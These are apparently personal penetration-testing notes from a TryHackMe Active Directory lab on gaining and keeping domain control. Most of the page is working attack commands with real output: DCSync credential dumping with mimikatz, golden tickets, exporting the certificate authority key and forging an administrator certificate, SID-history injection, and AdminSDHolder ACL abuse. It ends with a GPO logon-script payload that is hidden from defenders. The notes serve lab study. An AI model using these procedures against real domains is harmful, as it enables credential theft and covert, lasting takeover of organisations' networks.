#### Obtaining credentials
###### DC-Sync attack
DC Sync is a tool used to synchronise Domain data accross domains. Usually, it's used for having the same users/services in multiple physical locations (2 offices).
It copies the requested data across two domains.
To dump one user, use:
```
privilege::elevate
lsadump::dcsync /domain:DOMAIN /user:USERNAME@DOMAIN                // Note: the ERROR_NOT_UNIQUE error means the DOMAIN name isn't specified
```

To dump everything:
```
privilege::elevate
log dcdump.txt
lsadump::dcsync /domain:DOMAIN /all
```

#### Forging tickets
###### Golden tickets
Golden tickets are made by impersonating the `krbtgt`, forging a Ticket-Granting-Ticket (`tgt`). They will work as long as the `krbtgt` account's hash is not changed (twice, because both the current and previous hash will work, to avoid accidental password changes stopping productions), the persistence will stay.
It works because the way tickets are validated in the Key Distribution Center (`KDC`) is by checking if the ticket is encrypted with the `krbtgt` password hash.
A `tgt` is used to make a Ticket-Granting-Service (`tgs`), giving access to a target service.
Because any `tgs` made by the `tgt` is valid, this means connections can be made to any services, giving full access to the domain, and the data of the `DC`, to get the password hashes of all users.
To exploit, follow the [[Golden ticket]] instructions.
###### Silver tickets
Silver tickets are a lot like Golden tickets, but instead of having a `tgt` to generate any `tgs` for any service, there is only one `tgs`.
This means it's less useful, but not useless.
To create them, follow the [Silver ticket](Golden ticket#Silver tickets) instructions.

#### Certificate persistence
The Active Directory Certificate Services (`AD CS`) is used to grant certificates in an active directory.
These certificates can be used for encrypting file systems, verifying digital signatures, and most importantly, user authentication.
The centerpiece of the `AD CS` is the Certificate Auhtority (`CA`). 

To check if there is a certificate available (in `mimikatz`)
```
crypto::certificates /systemstore:local_machine
```
Search for the ID and name of the `CA` in the output, and remember the exports. Those files will be the targets.
To get the files:
```
privilege::debug
// Patch the memory to bypass export blocks
crypto::capi
crypto::cng
// Export
crypto::certificates /systemstore:local_machine /export
```

###### example output
```
mimikatz # crypto::certificates /systemstore:local_machine /export
 * System Store  : 'local_machine' (0x00020000)
 * Store         : 'My'

 0.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 040000000000703a4d78090a0ab10400000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 8:32:43 PM -> 4/27/2023 8:32:43 PM
    Hash SHA1: d6a84e153fa326554f095be4255460d5a6ce2b39
        Key Container  : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainControllerAuthentication-5ed52c94-34e8-4450-a751-a57ac55a110f
        |Unique name   : dbe5782f91ce09a2ebc8e3bde464cc9b_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO
        Public export  : OK - 'local_machine_My_0_.der'
        Private export : ERROR kull_m_crypto_exportPfx ; PFXExportCertStoreEx/kull_m_file_writeData (0x8009000b)

 1. za-THMDC-CA
    Subject  : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 90e157dae304ef429824a33d3a3ef91e
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 7:58:15 PM -> 4/27/2027 8:08:09 PM
    Hash SHA1: c12fcb4b88467854b3d4d7f762adb50b0fd8346e
        Key Container  : za-THMDC-CA
        Provider       : Microsoft Software Key Storage Provider
        Provider type  : cng (0)
        Type           : CNG Key (0xffffffff)
        |Provider name : Microsoft Software Key Storage Provider
        |Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ;
        Key Container  : za-THMDC-CA
        Unique name    : 8d666f3049de45dee20c70510f66d2cf_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Algorithm      : RSA
        Key size       : 2048 (0x00000800)
        Export policy  : 00000003 ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; )
        Exportable key : YES
        LSA isolation  : NO
        Public export  : OK - 'local_machine_My_1_za-THMDC-CA.der'
        Private export : OK - 'local_machine_My_1_za-THMDC-CA.pfx'

 2. THMDC.za.tryhackme.loc
    Subject  : CN=THMDC.za.tryhackme.loc
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 03000000000057c6f9be06e7c78d0300000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 8:32:43 PM -> 4/27/2023 8:32:43 PM
    Hash SHA1: a0e69ecef166b2d785a1b7d615ff730819443d42
        Key Container  : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-DomainController-ccb1e691-6606-40a3-a87a-f549bdcd757c
        |Unique name   : 520b5ca0aec81961ad476939c6792c13_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO
        Public export  : OK - 'local_machine_My_2_THMDC.za.tryhackme.loc.der'
        Private export : ERROR kull_m_crypto_exportPfx ; PFXExportCertStoreEx/kull_m_file_writeData (0x8009000b)

 3.
    Subject  :
    Issuer   : DC=loc, DC=tryhackme, DC=za, CN=za-THMDC-CA
    Serial   : 02000000000078856466521a82570200000010
    Algorithm: 1.2.840.113549.1.1.1 (RSA)
    Validity : 4/27/2022 8:32:18 PM -> 4/27/2023 8:32:18 PM
    Hash SHA1: 0d43237c50ccb446a07572545b5b4c8cf517682a
        Key Container  : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        Provider       : Microsoft RSA SChannel Cryptographic Provider
        Provider type  : RSA_SCHANNEL (12)
        Type           : AT_KEYEXCHANGE (0x00000001)
        |Provider name : Microsoft RSA SChannel Cryptographic Provider
        |Key Container : te-KerberosAuthentication-21e4d1ee-54f7-4ca5-b36b-b2cecff9a609
        |Unique name   : 544fc312c893025e32795e06e74c4517_32335b3b-2d6f-4ad7-a061-b862ac75bcb1
        |Implementation: CRYPT_IMPL_SOFTWARE ;
        Algorithm      : CALG_RSA_KEYX
        Key size       : 2048 (0x00000800)
        Key permissions: 0000003b ( CRYPT_ENCRYPT ; CRYPT_DECRYPT ; CRYPT_READ ; CRYPT_WRITE ; CRYPT_MAC ; )
        Exportable key : NO
        Public export  : OK - 'local_machine_My_3_.der'
        Private export : ERROR kull_m_crypto_exportPfx ; PFXExportCertStoreEx/kull_m_file_writeData (0x8009000b)
```
In this output, the id `1` is the `CA`, and the exports of it will be the target. 
These files are exported:
```
PS C:\Users\Administrator\persist> ls
Directory: C:\Users\Administrator\persist
Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/25/2023   9:22 PM           1423 local_machine_My_0_.der
-a----       10/25/2023   9:22 PM            939 local_machine_My_1_za-THMDC-CA.der
-a----       10/25/2023   9:22 PM           2685 local_machine_My_1_za-THMDC-CA.pfx
-a----       10/25/2023   9:22 PM           1534 local_machine_My_2_THMDC.za.tryhackme.loc.der
-a----       10/25/2023   9:22 PM           1465 local_machine_My_3_.der
```
The target are the public exports taken from the `CA`:
```
Public export  : OK - 'local_machine_My_1_za-THMDC-CA.der'
Private export : OK - 'local_machine_My_1_za-THMDC-CA.pfx'
```
To create certificates for user authentication, create
```
ForgeCert.exe --CaCertPath za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject CN=User --SubjectAltName Administrator@za.tryhackme.loc --NewCertPath fullAdmin.pfx --NewCertPassword Password123
```
To break down the command:

| `CaCertPath` | The path to the `.pfx` file |
| -- | -- |
| `CaCertPassword` | The password with which the `.pfx` file is encrypted |
| `Subkect` | The subject or common name of the certificate, when used for User authentication this has no use. |
| `SubjectAltName` |  |




#### SID History
SID history is used for migration from one `AD` to another, to be able to make a new user, but add the SID of the previous user to retain their privileges. This also works with groups, so a regular user with an SID history of the `Domain Admins` group, will have full `DA` privileges.
To check the current user's SID history:
```
Get-ADUser USERNAME -properties sidhistory,memberof
```
To get the SID of the `Domain Admins` group:
```
Get-ADGroup "Domain Admins"
```

Then, the NTDS needs to be stopped and patched with the extra `SID` history appended to the target user, before being started back up:
The tool used is [DSInternals](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Documentation/PowerShell/Add-ADDBSidHistory.md)

```
Stop-Service -Name ntds -force
Add-ADDBSidHistory -SamAccountName 'username of our low-priveleged AD account' -SidHistory 'SID to add to SID History' -DatabasePath C:\Windows\NTDS\ntds.dit 
Start-Service -Name ntds
```

###### Example exploiation
```
PS C:\Users\Administrator\persist> Get-ADGroup "Domain Admins"                                                                                                                                                                                            DistinguishedName : CN=Domain Admins,CN=Users,DC=za,DC=tryhackme,DC=loc                                                                                                                                                                                   GroupCategory     : Security                                                                                                                                                                                                                              GroupScope        : Global
Name              : Domain Admins                                                                                                                                                                                                                         ObjectClass       : group                                                                                                                                                                                                                                 ObjectGUID        : 3a8e1409-c578-45d1-9bb7-e15138f1a922                                                                                                                                                                                                  SamAccountName    : Domain Admins
SID               : S-1-5-21-3885271727-2693558621-2658995185-512

PS C:\Users\Administrator\persist> get-ADUser -filter *
PS C:\Users\Administrator\persist> Add-ADDBSidHistory -SamAccountName 'Aaron.jones' -SidHistory 'S-1-5-21-3885271727-2693558621-2658995185-512' -DatabasePath C:\Windows\NTDS\ntds.dit
PS C:\Users\Administrator\persist> Start-Service -Name ntds -force

PS C:\Users\Administrator\persist> Get-ADUser 'Aaron.jones' -properties sidhistory,memberof                                                                                                                                                               DistinguishedName : CN=aaron.jones,OU=Consulting,OU=People,DC=za,DC=tryhackme,DC=loc
Enabled           : True                                                                                                                                                                                                                                  GivenName         : Aaron                                                                                                                                                                                                                                 MemberOf          : {CN=Am0 Net Group 1,OU=IT,OU=People,DC=za,DC=tryhackme,DC=loc, CN=Internet Access,OU=Groups,DC=za,DC=tryhackme,DC=loc}
Name              : aaron.jones                                                                                                                                                                                                                           ObjectClass       : user                                                                                                                                                                                                                                  ObjectGUID        : 7d4c08e5-05b6-45c4-920d-2a6dbba4ca22                                                                                                                                                                                                  SamAccountName    : aaron.jones    
SID               : S-1-5-21-3885271727-2693558621-2658995185-1429                                                                                                                                                                                        SIDHistory        : {S-1-5-21-3885271727-2693558621-2658995185-512} 
Surname           : Jones                                                                                                                                                                                                                                 UserPrincipalName :        
```


#### Group membership
For persistence through group membership, 
```
New-ADGroup -Path "OU=IT,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "Net Group 1" -SamAccountName "nestgroup1" -DisplayName "Nest Group 1" -GroupScope Global -GroupCategory Security
New-ADGroup -Path "OU=SALES,OU=People,DC=ZA,DC=TRYHACKME,DC=LOC" -Name "Net Group 2" -SamAccountName "nestgroup2" -DisplayName "Nest Group 2" -GroupScope Global -GroupCategory Security 
Add-ADGroupMember -Identity "nestgroup2" -Members "nestgroup1"
Add-ADGroupMember -Identity "nestgroup1" -Members "TARGET_USERNAME"
```
#### Persistence through Access Control List (ACL)
Adding a user to every protected group can be easily detected and countered. So instead, use persistence through AD Group Templates.
One such template is the AdminSDHolder container. This container exists in every AD domain, and its Access Control List (ACL) is used as a template to copy permissions to all protected groups. Protected groups include privileged groups such as Domain Admins, Administrators, Enterprise Admins, and Schema Admins. If you are looking for the full list of groups, you can find them [here](https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)).
##### Persisting using `AdminSDHolder`
First, boot up the `mmc` (`windows-R` and enter `mmc`).
```
File --> Add Snap-In --> Active Directory Users and Computers
View --> enable "Advanded Features"
Active Directory users and Computers --> Target AD --> System --> AdminSDHolder
Right-click --> Properties --> Security
Then, add the target user:
Add --> Search for target username --> Check names --> OK --> Click "Allow" on Full Control --> Apply --> OK
```
By default, the group templates are reloaded every hour. This means waiting an entire hour after running this exploit to get full access, or forcing an update using `Invoke-ADSDPropagation.ps1`:
```
Import-Module .\Invoke-ADSDPropagation.ps1
Invoke-ADSDPropagation
```
After this was run, the target user will have full access. To make everything stable, add the user to the `Domain Admins` group.

#### Persistence through GPOs
First, boot up the `mmc`.
```
File --> Add/remove snap-in --> Group policy management --> Add        // From here, the Group Policy Management should be visible at the top of the open Console Root folder.
Console root --> Group Policy Management --> Forest: FOREST_NAME --> Domains --> DOMAIN --> Admins
Right-click the "Admins" (the location you just visited) --> Select "select Create a GPO in this domain, and Link it here" --> Name it --> OK
Right-click the policy --> Enable "Enforced"                           // Will run the policy no matter what
Right-click the policy --> "Edit" --> User configuration --> Policies --> Windows Settings --> Scripts (Logon / Logoff) --> Right-click "Logon" --> Properties --> Scripts --> Add --> Browse --> Payload (bat / exe (exe is untested so far)) --> Open --> OK --> Apply --> OK
// The previous line makes sure that whenever any Tier 0/1/2 admin logs in, the payload will be ran.
```
##### Hiding
Back to the MMC with the `Group Policy Management` added in:
```
Console root --> Group Policy Management --> Forest: FOREST_NAME --> Domains --> DOMAIN --> Admins --> The GPO rule made previously --> Delegation tab (the bar below the title text)
Remove all groups except for the "Authenticated Users", and the "ENTERPRISE DOMAIN CONTROLLERS" group.
Advanced button (right bottom) --> remove "CREATED OWNER"
// Hide completely (dangerous, if the exploit script placed doesn't work it can't be fixed.)
In the Advanced tab, remove "Authenticated users", and add "Domain Computers" --> enable only "Read" of "Domain Computers".
```